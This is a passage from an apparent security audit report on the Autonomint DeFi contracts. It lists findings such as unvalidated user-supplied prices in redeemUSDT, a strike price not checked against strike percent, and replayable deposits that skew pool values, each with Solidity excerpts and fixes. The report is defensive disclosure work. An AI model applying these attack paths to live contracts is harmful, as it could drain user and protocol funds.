        if (aBondAmount > userState.aBondBalance) revert IBorrowing.Borrow_InsufficientBalance();

        ITreasury treasury = ITreasury(treasuryAddress);
        // calculate abond usda ratio
        uint128 usdaToAbondRatio = uint128((treasury.abondUSDaPool() * RATE_PRECISION) / abond.totalSupply());
        uint256 usdaToBurn = (usdaToAbondRatio * aBondAmount) / RATE_PRECISION;
        // update abondUsdaPool in treasury
        treasury.updateAbondUSDaPool(usdaToBurn, false);

        // calculate abond usda ratio from liquidation
    @>  uint128 usdaToAbondRatioLiq = uint128((treasury.usdaGainedFromLiquidation() * RATE_PRECISION) /abond.totalSupply());
    @>  uint256 usdaToTransfer = (usdaToAbondRatioLiq * aBondAmount) / RATE_PRECISION;
        //update usdaGainedFromLiquidation in treasury
        treasury.updateUSDaGainedFromLiquidation(usdaToTransfer, false);

//////////////////////////////////////
/////////////////////////////////////
    }

    function updateAbondUSDaPool( uint256 amount, bool operation) external onlyCoreContracts {
        require(amount != 0, "Treasury:Amount should not be zero");
        if (operation) {
            abondUSDaPool += amount;
        } else {
            abondUSDaPool -= amount;
        }
    }

    function updateUSDaGainedFromLiquidation( uint256 amount, bool operation) external onlyCoreContracts {
        if (operation) {
            usdaGainedFromLiquidation += amount;
        } else {
            usdaGainedFromLiquidation -= amount;
        }
    }
```


### Impact


`updateUSDaGainedFromLiquidation(usdaToTransfer, true)` is not done, so the yeild gained from liquidation is updated to `abondUSDaPool`. Broken core contains the wrong functionality. Yield from liquidation will always be == 0




### PoC

_No response_

### Mitigation

call `updateUSDaGainedFromLiquidation(usdaToTransfer, true)` instead of `updateAbondUSDaPool` call on [borrowLiquidation.liquidationType1](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L208-L210)

# Issue H-35: Malicious Actors Can Exploit Incorrect USDa-USDT Price in redeemUSDT Function to Drain Funds 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1038 

## Found by 
0x23r0, 0x37, 0xAristos, 0xGondar, 0xNirix, 0xRaz, 0xTamayo, 0xbakeng, 0xloophole, Abhan1041, Audinarey, DDYYWW, EmreAy24, IzuMan, John44, Kirkeelee, LZ\_security, LordAlive, OrangeSantra, ParthMandale, PeterSR, RampageAudit, Waydou, dgnnn, dimah7, durov, elolpuer, futureHack, gss1, influenz, itcruiser00, jah, montecristo, newspacexyz, nuthan2x, pashap9990, rahim7x, santiellena, smbv-1923, super\_jack, t.aksoy, theweb3mechanic, valuevalk, vatsal, volodya, wellbyt3

### Summary

In the `redeemUSDT` function of the CDS contract, the USDA and USDT prices are supplied by the user without any validation for accuracy. This lack of verification allows an attacker to input fraudulent USDA-USDT prices, enabling them to withdraw more USDT than they are entitled to, which could result in the draining of the protocol's funds.

### Root Cause

https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L506C4-L545C6

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

An attacker can exploit the `redeemUSDT` function of the CDS contract by providing incorrect USDA and USDT prices as parameters. The function calculates the USDT value based on these user-provided inputs, and since there is no validation of their accuracy, the attacker can manipulate the values. This allows the attacker to receive an inflated amount of USDT, potentially draining the protocol’s funds.

### Impact

The attacker can drain the protocol’s funds by providing incorrect USDA and USDT prices, exploiting the lack of price validation in the `redeemUSDT` function. This allows the attacker to withdraw more USDT than intended, leading to a loss of funds for the protocol.

### PoC

_No response_

### Mitigation

The protocol should not rely on user-inputted prices and instead utilize oracle prices for price validation. This would ensure that the USDA and USDT prices used in the `redeemUSDT` function are accurate and prevent attackers from exploiting incorrect price inputs to drain the protocol’s funds.

# Issue H-36: Strike Price Not Validated Against Strike Percent, Leading to Exploitation Risk 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1039 

## Found by 
0x23r0, 0x37, 0x73696d616f, DDYYWW, LordAlive, Pablo, ParthMandale, PeterSR, durov, futureHack, gss1, influenz, newspacexyz, nuthan2x, pashap9990, santiellena, t.aksoy, tedox, volodya, wellbyt3

### Summary

The `strikePrice` and `strikePercent` are important parameters in the [Borrowing::depositTokens](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L226) function, which are passed to the `BorrowLib::deposit` function for option fee calculations. As the `strikePercent` increases, from 5% to 25%, the option fees decrease, while the potential for greater gains on `strikePrice` increases. A lower `strikePercent`, such as 5%, has a higher probability of generating returns due to the higher likelihood of ETH moving by 5%.


However, there is no validation to ensure that the `strikePrice` is logically consistent with the `strikePercent`. Malicious actors could exploit this by selecting a high `strikePercent` (e.g., 25%), thus paying lower option fees, and simultaneously selecting a low `strikePrice` (e.g., 5%), allowing them to benefit from the lower strike price associated with a smaller strikePercent. This mismatch can result in financial losses for the protocol.



### Root Cause

The issue arises from the lack of a validation check to ensure that the `strikePrice` aligns with the chosen `strikePercent`.


### Internal pre-conditions

_No response_

### External pre-conditions

The value of the collateral asset must increase by at least given 5% from its deposit value by the time of withdrawal.  


### Attack Path

1. Exploiting the missing validation, an attacker selects arbitrary values for `strikePercent` and `strikePrice`, even if they are not logically consistent.  
2. The attacker deposits tokens with a high `strikePercent` (e.g., 25%) and selects a low `strikePrice` (e.g., 5% higher than the deposited amount), resulting in low option fees but benefiting from the higher gains that should correspond to a lower `strikePercent`.  
3. This combination of a high `strikePercent` and low `strikePrice` allows the attacker to benefit from the returns typically associated with a lower `strikePercent`, causing an unfair advantage and financial losses for the protocol.

The strike price gains are [calculated](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L482) during withdrawal.

### Impact

The absence of proper checks allows users to input inconsistent `strikePercent` and `strikePrice` values. This leads to reduced option fees while securing gains that should be restricted to lower `strikePercent` values, causing financial losses to the protocol. It also negatively impacts the calculation of [upsideToDeduct](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L259), leading to a lower deduction than intended.


### PoC

_No response_

### Mitigation

To prevent exploitation, ensure that the `strikePercent` and `strikePrice` are validated against each other at the time of deposit. The following check can be applied:


# Issue H-37: `treasury.updateYieldsFromLiquidatedLrts()` updates the yield in the current chain, but collateral may be in the other chain 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1052 

## Found by 
0x73696d616f

### Summary

[treasury.updateYieldsFromLiquidatedLrts()](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L667-L670) updates the yield from liquidated collateral in the current chain, but this collateral could have been present in the other chain. As such, it will allow the protocol to withdrawal yields that it should not in the current chain, which means other deposited collateral may not be withdrawn due to having been allocated as yield instead.

### Root Cause

In `CDSLib::667`, the treasury is updated with liquidated collateral yield, but this yield may be present in the other chain.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Borrower is liquidated in chain B.
2. Some time passes and a cds depositor in chain A withdraws a part of the collateral, and updates the treasury with yield generated.
3. The yield generated is not actually present in chain A, and is in chain B instead, so it will add yield to the treasury that is not actually backed in chain A.
4. Protocol withdraws the yield in chain A, which is taken from other borrower deposits, who may not be able to withdraw due to lack of liquidity (or similar).

### Impact

Lack of funds in chain A, leading to DoSed withdrawals.

### PoC

None.

### Mitigation

The yields should always be set in the chain that the liquidation happened and the collateral is held.

# Issue M-1: Lock-in period option for dCDS users is not enforced when trying to withdraw. 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/60 

## Found by 
0xbakeng, Cybrid, valuevalk

### Summary
The lock-in period option set during deposit, for dCDS users is not enforced when trying to withdraw.

### Root Cause
As it can be seen from the docs https://docs.autonomint.com/autonomint/blockchain-docs/core-contracts/cds#deposit
and the deposit function there is a param called lockingPeriod, which the user can use to specify/make a longer locking period, with a minimum of 1 month by requirement.
```solidity
function deposit(
        uint128 usdtAmount,
        uint128 usdaAmount,
        bool liquidate,
        uint128 liquidationAmount,
        uint128 lockingPeriod ) payable 
```
> lockingPeriod | uint128 | How long the user is willing to stay deposited in the protocol.
However, currently it's just set during deposit in [CDSLib.sol#L534](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L534) but later is not enforced when withdrawing.

This could also be seen from the frontend
![image](https://github.com/user-attachments/assets/a0176ec0-eff6-4de0-8c5a-44c5eb2445f3)

A longer lockingperiod could be specified:
https://docs.autonomint.com/autonomint/autonomint-1/guides/how-to/dcds-interface

### Flow of issue
1. User wants to lock-in for a longer period, for example, 60 days.
2. He specifies during the deposit the 60 days duration
3. Since the problem is that this value is not enforced during withdraw() in CDS.sol, he would be able to withdraw earlier.

### Impact
The option will not work, as the value set during a deposit won't be used and the user could withdraw earlier.

### Mitigation
Enforce that value upon withdrawing.

# Issue M-2: Cross-chain wrsETH amount is wrapped before the treasury have received it, which could revert the whole transaction 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/69 

## Found by 
0x37, John44, valuevalk

### Summary
When performing a dCDS withdrawal, if the user has opted in for liquidations, there are cases where we need to retrieve collateral (ETH/rsETH or other) from another chain. However, the protocol attempts to wrap the `wrsETH` before it has been received, causing the transaction to revert.

### Root Cause
In the case of liquidation opt-in for a dCDS depositor, we may need to retrieve ETH from another chain. This situation occurs when liquidations happen on a different chain, and the collateral retrieved from them is stored there.

In `CDSLib.sol`, the liquidation calculation logic is implemented [here - CDSLib.sol#L624-L777](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L624-L777).

The issue arises because the protocol attempts to wrap the funds in the treasury before they have been received, leading to a transaction revert.
```solidity
                    interfaces.globalVariables.oftOrCollateralReceiveFromOtherChains{value: msg.value - params.fee}(
                        IGlobalVariables.FunctionToDo(
                            // Call getLzFunctionToDo in cds library to get, which action needs to do in dst chain
                            getLzFunctionToDo(params.optionsFeesToGetFromOtherChain, collateralToGetFromOtherChain)
                        ),
                        IGlobalVariables.USDaOftTransferData(
                            address(interfaces.treasury), params.optionsFeesToGetFromOtherChain
                        ),
                        IGlobalVariables.CollateralTokenTransferData(
                         address(interfaces.treasury)
                            ethAmountFromOtherChain,
                            weETHAmountFromOtherChain,
                            rsETHAmountFromOtherChain
                        ),
                        IGlobalVariables.CallingFunction.CDS_WITHDRAW,
                        msg.sender
                    );
                    if (rsETHAmountFromOtherChain > 0) {
                        //@audit-issue this is incorrect. Its not yet received, and we wrap it here?
@>>                    interfaces.treasury.wrapRsETH(rsETHAmountFromOtherChain);
                    }
```
LayerZero needs technical time to process the transaction, send it to the other chain, and wait for the other chain to respond and send the requesting chain the collateral.

### Internal Preconditions
Liquidations for `rsETH` have occurred on the other chain, and there are not enough `rsETH` resources on the current chain to cover the share of `rsETH` owed to the dCDS user depositor.

### Attack Path
A normal dCDS depositor attempts to withdraw their position, which is opted-in for liquidations.

### Impact
The transaction reverts, resulting in the inability to withdraw funds from the dCDS.

### Mitigation
Avoid wrapping the `rsETH` before receiving it.

# Issue M-3: DOS to `liquidateBorrowPosition` on MODE chain 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/131 

## Found by 
John44, nuthan2x, valuevalk

### Summary


[borrowLiquidation.liquidateBorrowPosition](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L150-L165) is done via `liquidationType1` with CDS pool, or via `liquidationType2` on synthetix. According to team, the `liquidationType2` is chosen if `liquidationType1` reverts when USDa in CDS is not enough to liquidate, ex: during [omniChainData.totalAvailableLiquidationAmount < liquidationAmountNeeded](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L216)

In these cases, the `liquidationType2` is used to liquidate. But synthetix protocol isn't there on MODE. Hence liquidations fail. There will be DOS till USDa is available on CDS.



### Root Cause


`liquidationType2` is possible only Optimism and not possible on MODE due to the absence of synthetix protocol on MODE. so liquidationType2 will revert.


### Internal pre-conditions


when USDa in CDS isn't enough to cover the liquidation, so `liquidationType2` has to be chosen



### External pre-conditions


liquidation happening on MODE chain




### Attack Path


A user's position should be liquidated so, admin calls `liquidateBorrowPosition` via borrowing contract. Since, the USDa amount on CDS is low enough, we can't choose type 1 liquidation due to a strict revert check. So, type 2 is chosen to short on synthetix, but it will revert due to the absence of synthetix protocol on MODE

[borrowLiquidation.liquidateBorrowPosition](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L150-L165)
```solidity

    function liquidateBorrowPosition(
        address user,
        uint64 index,
        uint64 currentEthPrice,
        IBorrowing.LiquidationType liquidationType,
        uint256 lastCumulativeRate
    ) external payable onlyBorrowingContract returns (CDSInterface.LiquidationInfo memory liquidationInfo) {
        //? Based on liquidationType do the liquidation
        // Type 1: Liquidation through CDS
        if (liquidationType == IBorrowing.LiquidationType.ONE) {
   @>       return liquidationType1(user, index, currentEthPrice, lastCumulativeRate);
            // Type 2: Liquidation by taking short position in synthetix with 1x leverage
        } else if (liquidationType == IBorrowing.LiquidationType.TWO) {
   @>       liquidationType2(user, index, currentEthPrice);
        }
    }

    function liquidationType2(
        address user,
        uint64 index,
        uint64 currentEthPrice
    ) internal {
//////////////////////////////////////
/////////////////////////////////////

        // Mint sETH
        wrapper.mint(amount);
        // Exchange sETH with sUSD
   @>   synthetix.exchange(
            0x7345544800000000000000000000000000000000000000000000000000000000,
            amount,
            0x7355534400000000000000000000000000000000000000000000000000000000
        );

        // Calculate the margin
        int256 margin = int256((amount * currentEthPrice) / 100);
        // Transfer the margin to synthetix
        synthetixPerpsV2.transferMargin(margin);

        // Submit an offchain delayed order in synthetix for short position with 1X leverage
        synthetixPerpsV2.submitOffchainDelayedOrder(
            -int((uint(margin * 1 ether * 1e16) / currentEthPrice)),
            currentEthPrice * 1e16
        );
    }

    function liquidationType1(
        address user,
        uint64 index,
        uint64 currentEthPrice,
        uint256 lastCumulativeRate
    ) internal returns (CDSInterface.LiquidationInfo memory liquidationInfo) {

//////////////////////////////////////
/////////////////////////////////////
        // Calculate borrower's debt
        uint256 borrowerDebt = ((depositDetail.normalizedAmount * lastCumulativeRate) / BorrowLib.RATE_PRECISION);
        uint128 returnToTreasury = uint128(borrowerDebt);

        // 20% to abond usda pool
        uint128 returnToAbond = BorrowLib.calculateReturnToAbond(depositDetail.depositedAmountInETH, depositDetail.ethPriceAtDeposit, returnToTreasury);
        treasury.updateAbondUSDaPool(returnToAbond, true);
        // Calculate the CDS profits
        uint128 cdsProfits = (((depositDetail.depositedAmountInETH * depositDetail.ethPriceAtDeposit) / BorrowLib.USDA_PRECISION) / 100) - returnToTreasury - returnToAbond;
        // Liquidation amount in usda needed for liquidation
        uint128 liquidationAmountNeeded = returnToTreasury + returnToAbond;
        // Check whether the cds have enough usda for liquidation
   @>   require(omniChainData.totalAvailableLiquidationAmount >= liquidationAmountNeeded, "Don't have enough USDa in CDS to liquidate");

//////////////////////////////////////
/////////////////////////////////////
        return liquidationInfo;
    }

```

### Impact



DOS to liquidations on MODE chain, due to reverts of both `liquidationType1` and `liquidationType2`. Liquidation is an important part of system, so DOSing it under conditions like `low USDa amount on CDS` will be an issue.


### PoC

_No response_

### Mitigation




If liquidationType1 reverts due to lack of USDa, then implement type 3 on mode network to integrate with a fork/similar protocol like synthetix allows to `Liquidate the position by taking short position`

# Issue M-4: No slippage protection when exchanging with synthethix 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/173 

## Found by 
valuevalk

### Summary
The lack of slippage protection when exchanging assets on Synthetix can result in bricking the liquidation process for a borrower.

### Root Cause
 
As it can be seen from the [synthetix repo](https://github.com/Synthetixio/synthetix/blob/de2b994cc8064301288e7619042287cddb7c6753/contracts/BaseSynthetix.sol#L203-L219) and from the interface we have in [autonomint](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L23-L29): 

When calling `exchange()` in `liquidationType2` when doing liquidation in `borrowingLiquidations.sol`
```solidity
   synthetix.exchange(
            0x7345544800000000000000000000000000000000000000000000000000000000,
            amount,
            0x7355534400000000000000000000000000000000000000000000000000000000
        );
```

we are supposed to get back the amount received:
```solidity
interface ISynthetix {
    function exchange(
        bytes32 sourceCurrencyKey,
        uint sourceAmount,
        bytes32 destinationCurrencyKey
@>> ) external returns (uint amountReceived);
}
```
as with every dex, its almost certain `amountReceived != amount`, it could be a very little difference, but it would be a difference, which is enough to break next parts of our code:

```solidity
        // Exchange sETH with sUSD
        synthetix.exchange(
            0x7345544800000000000000000000000000000000000000000000000000000000,
            amount,
            0x7355534400000000000000000000000000000000000000000000000000000000
        );

        // Calculate the margin
@>>     int256 margin = int256((amount * currentEthPrice) / 100);
        // Transfer the margin to synthetix
@>>     synthetixPerpsV2.transferMargin(margin);
```
After exchanging the `sETH` and receiving `sUSD`, the amount of margin to be transferred to `synthetixPerpsV2` is calculated based on the exact `amount of ETH` exchanged. However, if slightly less `sUSD` is received due to slippage, there won't be enough margin, and the transaction will revert when calling `synthetixPerpsV2.transferMargin(margin)`.

### Internal Preconditions

_No response_

### External Preconditions

_No response_

### Attack Path
- `LiquidationType2` is supposed to be called by an admin.
- The admin is unable to call it because the transaction reverts due to the absence of slippage tolerance in the current logic.
- This results in bricking the liquidation process and causing a denial of service (DoS) for the transaction.

### Impact
- Liquidations must be consistently available. The current logic could cause a DoS, making `LiquidationType2` unavailable.

### Mitigation
Use the returned `amountReceived` and apply slippage protection with a small deviation, such as 0–0.5%.

# Issue M-5: Withdrawing ionic during liquidation has a flaw 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/198 

## Found by 
0x73696d616f, Audinarey, valuevalk

### Summary
During liquidation only record yield accrued from IONIC, however those yields are not utilized/there is no way to withdraw them.

### Root Cause
The case where we update `treasury.updateInterestFromExternalProtocol` we use  `treasury.withdrawFromExternalProtocolDuringLiq(user, index)`, which essentially gives us only the extra yield accrued:
```solidity
    function withdrawFromExternalProtocolDuringLiq(address user, uint64 index) external onlyCoreContracts returns (uint256)
    {
        uint256 balanceBeforeWithdraw = address(this).balance;
        uint256 redeemAmount = withdrawFromIonicDuringLiq(user, index);
        if (address(this).balance < redeemAmount + balanceBeforeWithdraw) {
            revert Treasury_WithdrawExternalProtocolDuringLiqFailed();
        }
@>>     return (redeemAmount - (borrowing[user].depositDetails[index].depositedAmount * 50) / 100);
    } 
```

Reference during liquidation:
```solidity
       // Update treasury data
        treasury.updateTotalVolumeOfBorrowersAmountinWei(depositDetail.depositedAmountInETH);
        treasury.updateTotalVolumeOfBorrowersAmountinUSD(depositDetail.depositedAmountUsdValue);
        treasury.updateDepositedCollateralAmountInWei(depositDetail.assetName, depositDetail.depositedAmountInETH);
        treasury.updateDepositedCollateralAmountInUsd(depositDetail.assetName, depositDetail.depositedAmountUsdValue);
@>>     treasury.updateTotalInterestFromLiquidation(totalInterestFromLiquidation);
        treasury.updateYieldsFromLiquidatedLrts(yields);
        treasury.updateDepositDetails(user, index, depositDetail);

        globalVariables.updateCollateralData(depositDetail.assetName, collateralData);
        globalVariables.setOmniChainData(omniChainData);

        // If the liquidation amount to get from other is greater than zero,
        // Get the amount from other chain.
        if (liqAmountToGetFromOtherChain > 0) {
            // Call the oftOrCollateralReceiveFromOtherChains function in global variables
            globalVariables.oftOrCollateralReceiveFromOtherChains{value: msg.value}(
                IGlobalVariables.FunctionToDo(3),
                IGlobalVariables.USDaOftTransferData(address(treasury), liqAmountToGetFromOtherChain),
                // Since we don't need ETH, we have passed zero params
                IGlobalVariables.CollateralTokenTransferData(address(0), 0, 0, 0),
                IGlobalVariables.CallingFunction.BORROW_LIQ,
                admin
            );
        }

        // If the collateral is ETH, withdraw the deposited ETH in external protocol
        if (depositDetail.assetName == IBorrowing.AssetName.ETH) {
@>>         treasury.updateInterestFromExternalProtocol(treasury.withdrawFromExternalProtocolDuringLiq(user, index));
        }
```
As it can be seen above `updateTotalInterestFromLiquidation` is also updated, but we have a way to withdraw it in [Treasury.sol](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L616-L625):
```solidity
    function withdrawInterest(
        address toAddress,
        uint256 amount
    ) external onlyOwner {
        require(toAddress != address(0) && amount != 0,"Input address or amount is invalid");
        require(amount <= (totalInterest + totalInterestFromLiquidation),"Treasury don't have enough interest");
        totalInterest -= amount;
        bool sent = usda.transfer(toAddress, amount);
        require(sent, "Failed to send Ether");
    }
```
As mentioned unfortunately we don't handle the yield from IONIC in any way, as the `interestFromExternalProtocolDuringLiquidation` property in `Treasury.sol` is unused:
```solidity
  function updateInterestFromExternalProtocol(uint256 amount) external onlyCoreContracts {
        interestFromExternalProtocolDuringLiquidation += amount;
    }
```

### Impact
- No way to withdraw or use the yield generated from IONIC, its just left unused.

### Mitigation
Either integrate a way to use the yield from IONIC, or a way to be withdrawn.

# Issue M-6: An attacker can manipulate `omniChainData.cdsPoolValue` by breaking protocol. 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/263 

## Found by 
0x37, 0x73696d616f, 0xAristos, CL001, Pablo, RampageAudit, almurhasan, gss1, newspacexyz, nuthan2x, onthehunt, super\_jack, theweb3mechanic, tjonair, volodya

### Summary

Missing update of `lastEthprice` in `borrowing.sol#depositTokens()` will cause manipulation of `omniChainData.cdsPoolValue` as an attaker replays `borrowing.sol#depositTokens()` by breaking protocol.

https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L258

### Root Cause

- In `borrowing.sol#depositTokens()`, `lastEthprice` is not updated.
```solidity
    function depositTokens(
        BorrowDepositParams memory depositParam
    ) external payable nonReentrant whenNotPaused(IMultiSign.Functions(0)) {
        // Assign options for lz contract, here the gas is hardcoded as 400000, we got this through testing by iteration
        bytes memory _options = OptionsBuilder.newOptions().addExecutorLzReceiveOption(400000, 0);
        // calculting fee
        MessagingFee memory fee = globalVariables.quote(
            IGlobalVariables.FunctionToDo(1),
            depositParam.assetName,
            _options,
            false
        );
        // Get the exchange rate for a collateral and eth price
        (uint128 exchangeRate, uint128 ethPrice) = getUSDValue(assetAddress[depositParam.assetName]);

        totalNormalizedAmount = BorrowLib.deposit(
            BorrowLibDeposit_Params(
                LTV,
                APR,
                lastCumulativeRate,
                totalNormalizedAmount,
                exchangeRate,
                ethPrice,
                lastEthprice
            ),
            depositParam,
            Interfaces(treasury, globalVariables, usda, abond, cds, options),
            assetAddress
        );

        //Call calculateCumulativeRate() to get currentCumulativeRate
        calculateCumulativeRate();
        lastEventTime = uint128(block.timestamp);

        // Calling Omnichain send function
        globalVariables.send{value: fee.nativeFee}(
            IGlobalVariables.FunctionToDo(1),
            depositParam.assetName,
            fee,
            _options,
            msg.sender
        );
    }
```
- In BorrowLib.sol:661, omniChainData is updated with new cdsPoolValue.
```solidity
    (ratio, omniChainData) = calculateRatio(
        params.depositingAmount,
        uint128(libParams.ethPrice),
        libParams.lastEthprice,
        omniChainData.totalNoOfDepositIndices,
        omniChainData.totalVolumeOfBorrowersAmountinWei,
        omniChainData.totalCdsDepositedAmount - omniChainData.downsideProtected,
        omniChainData
    );
    // Check whether the cds have enough funds to give downside prottection to borrower
    if (ratio < (2 * RATIO_PRECISION)) revert IBorrowing.Borrow_NotEnoughFundInCDS();
```
- In `BorrowLib.sol#calculateRatio()`, cdsPoolValue is updated by difference between lastEthprice and currentEthprice.
```solidity
    function calculateRatio(
        uint256 amount,
        uint128 currentEthPrice,
        uint128 lastEthprice,
        uint256 noOfDeposits,
        uint256 totalCollateralInETH,
        uint256 latestTotalCDSPool,
        IGlobalVariables.OmniChainData memory previousData
    ) public pure returns (uint64, IGlobalVariables.OmniChainData memory) {
        uint256 netPLCdsPool;

        // Calculate net P/L of CDS Pool
        // if the current eth price is high
        if (currentEthPrice > lastEthprice) {
            // profit, multiply the price difference with total collateral
@>          netPLCdsPool = (((currentEthPrice - lastEthprice) * totalCollateralInETH) / USDA_PRECISION) / 100;
        } else {
            // loss, multiply the price difference with total collateral
@>          netPLCdsPool = (((lastEthprice - currentEthPrice) * totalCollateralInETH) / USDA_PRECISION) / 100;
        }

        uint256 currentVaultValue;
        uint256 currentCDSPoolValue;

        // Check it is the first deposit
        if (noOfDeposits == 0) {
            // Calculate the ethVault value
            previousData.vaultValue = amount * currentEthPrice;
            // Set the currentEthVaultValue to lastEthVaultValue for next deposit
            currentVaultValue = previousData.vaultValue;

            // Get the total amount in CDS
            // lastTotalCDSPool = cds.totalCdsDepositedAmount();
            previousData.totalCDSPool = latestTotalCDSPool;

            // BAsed on the eth prices, add or sub, profit and loss respectively
            if (currentEthPrice >= lastEthprice) {
@>              currentCDSPoolValue = previousData.totalCDSPool + netPLCdsPool;
            } else {
@>              currentCDSPoolValue = previousData.totalCDSPool - netPLCdsPool;
            }

            // Set the currentCDSPoolValue to lastCDSPoolValue for next deposit
@>          previousData.cdsPoolValue = currentCDSPoolValue;
@>          currentCDSPoolValue = currentCDSPoolValue * USDA_PRECISION;
        } else {
            // find current vault value by adding current depositing amount
            currentVaultValue = previousData.vaultValue + (amount * currentEthPrice);
            previousData.vaultValue = currentVaultValue;

            // BAsed on the eth prices, add or sub, profit and loss respectively
            if (currentEthPrice >= lastEthprice) {
                previousData.cdsPoolValue += netPLCdsPool;
            } else {
                previousData.cdsPoolValue -= netPLCdsPool;
            }
@>          previousData.totalCDSPool = latestTotalCDSPool;
@>          currentCDSPoolValue = previousData.cdsPoolValue * USDA_PRECISION;
        }

        // Calculate ratio by dividing currentEthVaultValue by currentCDSPoolValue,
        // since it may return in decimals we multiply it by 1e6
@>      uint64 ratio = uint64((currentCDSPoolValue * CUMULATIVE_PRECISION) / currentVaultValue);
        return (ratio, previousData);
    }
```

### Internal pre-conditions

_No response_

### External pre-conditions

- Eth price changed a little from borrowing.sol#lastEthprice.


### Attack Path

- We say that current ratio is bigger than `2 * RATIO_PRECISION`.
- An attaker continues to replay `borrowing.sol#depositTokens`.
- Then, `omniChainData.cdsPoolValue` continues to be increased or decreased.


### Impact

- In case of increasing, `cdsPoolValue` can be much bigger than normal. Then, borrowing is allowed even if protocol is really under water.
- In case of decreasing, `cdsPoolValue` can be decreased so that ratio is small enough to touch `(2 * RATIO_PRECISION)`. Then, borrowing can be DOSed even if cds have enough funds. And withdrawal from CDS can be DOSed.


### PoC

_No response_

### Mitigation

`borrowing.sol#depositTokens()` function has to be modified as follows.
```solidity
    function depositTokens(
        BorrowDepositParams memory depositParam
    ) external payable nonReentrant whenNotPaused(IMultiSign.Functions(0)) {
        // Assign options for lz contract, here the gas is hardcoded as 400000, we got this through testing by iteration
        bytes memory _options = OptionsBuilder.newOptions().addExecutorLzReceiveOption(400000, 0);
        // calculting fee
        MessagingFee memory fee = globalVariables.quote(
            IGlobalVariables.FunctionToDo(1),
            depositParam.assetName,
            _options,
            false
        );
        // Get the exchange rate for a collateral and eth price
        (uint128 exchangeRate, uint128 ethPrice) = getUSDValue(assetAddress[depositParam.assetName]);

        totalNormalizedAmount = BorrowLib.deposit(
            BorrowLibDeposit_Params(
                LTV,
                APR,
                lastCumulativeRate,
                totalNormalizedAmount,
                exchangeRate,
                ethPrice,
                lastEthprice
            ),
            depositParam,
            Interfaces(treasury, globalVariables, usda, abond, cds, options),
            assetAddress
        );

        //Call calculateCumulativeRate() to get currentCumulativeRate
        calculateCumulativeRate();
        lastEventTime = uint128(block.timestamp);
++      lastEthprice = ethPrice;

        // Calling Omnichain send function
        globalVariables.send{value: fee.nativeFee}(
            IGlobalVariables.FunctionToDo(1),
            depositParam.assetName,
            fee,
            _options,
            msg.sender
        );
    }
```

# Issue M-7: when the liquidate function(function liquidationType1) is called vaultvalue(liquidated collateral value) is not decreased from omniChainData.vaultValue. As a result, the cds/borrow ratio will always be less than the real cds/borrow ratio. 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/351 

## Found by 
almurhasan, volodya

### Summary

when the function withdraw(borrowlib.sol) is called, vaultvalue is decreased from omniChainData.vaultValue but when the liquidate function(function liquidationType1) is called vaultvalue(liquidated collateral value) is not decreased from omniChainData.vaultValue. As a result, the cds/borrow ratio will always be less than the actual/real cds/borrow ratio.in some cases, new stable coins should be minted. But as  vaultvalue is not decreased from omniChainData.vaultValue, so ratio(which is incorrect) is below 0.2(),now users can’t mint new stablecoin and cds users can’t withdraw. 


### Root Cause

when the liquidate function(function liquidationType1) is called vaultvalue is not decreased from omniChainData.vaultValue.


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Let’s assume, currently omniChainData.cdsPoolValue = 350,  omniChainData.vaultValue = 2000, so cds/borrow ratio = 350/2000 = 0.175(which is below 0.2, so new stablecoin can’t be minted).

